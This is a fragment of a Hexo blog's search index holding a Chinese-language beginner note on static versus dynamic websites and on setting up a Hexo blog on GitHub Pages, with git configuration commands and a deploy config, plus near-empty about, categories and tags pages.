        <content type="html"><![CDATA[<p><strong>个人网站搭建</strong></p><h2>简单基础知识准备</h2><p>静态页面和动态页面</p><p>静态页面：没有后台，不添加数据库，为静态网站，只有静态资源，相对安全<br>特点：维护麻烦，功能单一，但是相对安全</p><p>动态页面：实现值的传递，接收传值的都是动态页面，为动态网站，<br>会去加载静态资源，接收用户提交的信息，接收过程以及后台处理<br>用户提交的信息过程均存在风险<br>特点：功能强大，维护简单，容易出现风险<br>常见漏洞：sql注入，xss，文件上传，反序列化，代码注入</p><p>常见的传值方式：<br>GET传值<br>POST传值</p><p></p><h2>搭建个人博客</h2><br>搭基于node.js，git，hexo的静态博客<br>注册github，安装node.js，安装git<p></p><p>markdown 标记语法</p><p>git首次需添加用户名和用户邮箱：<br>打开git bash，输入下列命令：<br><code><br>    $ git config –global user.name “UserName”<br>    $ git config –global user.email “UserEmail”<br>    $ git config –get-all user.email<br></code></p><p>_config.yml中修改配置<br><code><br>url: <a href="https://TuringGu.github.io">https://TuringGu.github.io</a><br>deploy:<br>  type: git<br>  repo: <a href="https://github.com/TuringGu/TuringGu.github.io.git" target="_blank" rel="noopener">https://github.com/TuringGu/TuringGu.github.io.git</a><br>  branck: master<br></code></p>]]></content>
      
      
      
        <tags>
            
            <tag> 标签 </tag>
            
        </tags>
      
    </entry>
    
  
  
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p>如果觉得主题刺眼，可使用Chrome扩展插件<code>Dark Reader</code><br>可以自动将绝大部分网页变成护眼黑色<br>快捷键：<code>Alt</code>+<code>Shift</code>+<code>d</code></p>]]></content>
      
    </entry>
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[<h2 id="nothing-here"><a href="#nothing-here" class="headerlink" title="nothing here"></a>nothing here</h2>]]></content>
      
    </entry>
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
  
</search>
